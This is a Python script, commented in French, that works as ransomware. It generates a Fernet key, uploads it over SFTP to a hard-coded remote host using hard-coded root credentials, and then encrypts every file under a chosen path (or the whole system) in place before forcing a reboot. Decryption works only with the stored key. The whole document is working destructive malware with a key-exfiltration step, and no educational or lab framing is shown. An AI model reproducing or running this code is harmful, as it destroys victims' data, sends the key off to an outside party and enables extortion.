from cryptography.fernet import Fernet
import os
import sqlite3
import sys
import subprocess
import paramiko


def check_root():
    """Vérifie si le script est exécuté en tant que root."""
    if os.geteuid() != 0:
        print("Ce script doit être exécuté en tant que root.")
        sys.exit(1)


def generate_key():
    """Génère et enregistre une clé de chiffrement."""
    key = Fernet.generate_key()
    with open("/root/secret.key", "wb") as key_file:
        key_file.write(key)
    return key


def load_key():
    """Charge la clé de chiffrement."""
    return open("/root/secret.key", "rb").read()


def send_key_to_sftp(key):
    """Envoie la clé de chiffrement au serveur SFTP."""
    sftp_host = "192.168.45.79"  # Remplace avec ton hôte SFTP
    sftp_port = 22  # Port SFTP (généralement 22)
    sftp_username = "root"  # Nom d'utilisateur pour SFTP
    sftp_password = "P@ssw0rd"  # Mot de passe pour SFTP
    remote_path = "/secret.key"  # Chemin distant où la clé sera envoyée

    try:
        transport = paramiko.Transport((sftp_host, sftp_port))
        transport.connect(username=sftp_username, password=sftp_password)
        sftp = paramiko.SFTPClient.from_transport(transport)
        # Sauvegarde de la clé dans un fichier temporaire
        with open("/root/secret.key", "wb") as f:
            f.write(key)
        # Envoi du fichier vers le serveur SFTP
        sftp.put("/root/secret.key", remote_path)
        sftp.close()
        transport.close()
        print(f"Clé envoyée à {sftp_host}:{remote_path}")
    except Exception as e:
        print(f"Erreur lors de l'envoi de la clé via SFTP: {e}")


def encrypt_file(file_path, cipher):
    """Chiffre un fichier en remplaçant son contenu."""
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
    except Exception as e:
        print(f"[ERREUR] Impossible de chiffrer {file_path}: {e}")


def decrypt_file(file_path, cipher):
    """Déchiffre un fichier en restaurant son contenu original."""
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
    except Exception as e:
        print(f"[ERREUR] Impossible de déchiffrer {file_path}: {e}")


def process_directory(directory, cipher, encrypt=True):
    """Parcourt un dossier et chiffre/déchiffre chaque fichier tout en évitant les fichiers critiques du système."""
    system_exclude = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/root/secret.key"]

    for root, _, files in os.walk(directory):
        if any(root.startswith(excl) for excl in system_exclude):
            continue

        for file in files:
            file_path = os.path.join(root, file)
            try:
                if encrypt:
                    encrypt_file(file_path, cipher)
                else:
                    decrypt_file(file_path, cipher)
                print(f"{'Chiffré' if encrypt else 'Déchiffré'} : {file_path}")
            except Exception as e:
                print(f"[ERREUR] sur {file_path}: {e}")


def restart_system():
    """Redémarre le système après chiffrement."""
    print("Redémarrage du système dans 10 secondes...")
    subprocess.run(["shutdown", "-r", "now"])


if __name__ == "__main__":
    check_root()
    directory = input("Entrez le chemin du dossier à traiter (/ pour tout le système) : ")
    action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()

    if action == 'E':
        key = generate_key()
        send_key_to_sftp(key)
    else:
        key = load_key()

    cipher = Fernet(key)
    process_directory(directory, cipher, encrypt=(action == 'E'))

    if action == 'E':
        restart_system()